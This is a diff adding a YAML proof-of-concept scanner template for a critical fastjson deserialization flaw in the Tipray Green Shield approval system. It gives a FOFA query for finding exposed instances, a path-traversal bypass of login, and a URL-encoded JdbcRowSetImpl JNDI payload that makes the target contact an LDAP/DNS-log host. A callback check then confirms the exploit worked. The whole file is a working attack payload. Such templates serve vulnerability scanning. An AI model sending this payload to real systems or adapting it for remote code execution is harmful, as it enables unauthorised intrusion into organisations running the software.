@@ -1,0 +1,42 @@
+id: poc-yaml-tipray-gsas-updatefileprintparamsd-do-fastjson-deserialization
+info:
+  name: 天锐绿盾审批系统 updateFilePrintParamsD.do fastjson 反序列化漏洞
+  severity: critical
+  tags:
+  - 反序列化
+  - DNSLOG
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  random: random_str(6)
+  paths: 'updateFilePrintParamsD.do
+
+    updateFileOutSendParameter.do
+
+    updateScreenshotParameter.do
+
+    updateBehaviorCtrlParams.do
+
+    '
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/task/{{.paths}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+"ldap://{{.domain}}/{{.random}}"%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
+  expression: '(
+
+    (status_code == 500 && contains(body,"Internal Server Error"))
+
+    ||
+
+    (status_code == 200 && body == "false")
+
+    ) &&
+
+    reverse.Verify()
+
+    '
+transport: http
